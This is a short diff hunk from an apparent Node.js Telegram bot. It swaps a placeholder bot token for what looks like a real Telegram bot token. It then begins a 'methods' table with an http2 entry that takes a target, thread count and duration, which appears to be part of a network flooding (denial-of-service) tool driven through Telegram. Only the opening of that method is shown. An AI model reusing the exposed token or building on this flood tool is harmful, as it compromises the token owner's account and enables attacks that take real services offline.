@@ -3,7 +3,7 @@ const http2 = require("http2");
 const net = require("net");
 const puppeteer = require("puppeteer");
 
-const bot = new Telegraf("ISI_TOKEN_BOT_LO");
+const bot = new Telegraf("7977154129:AAH6oUA8iBDUYIgsVKmzhllaAaBDbW4iH_Y");
 
 const methods = {
   http2: (target, threads = 100, duration = 60) => {
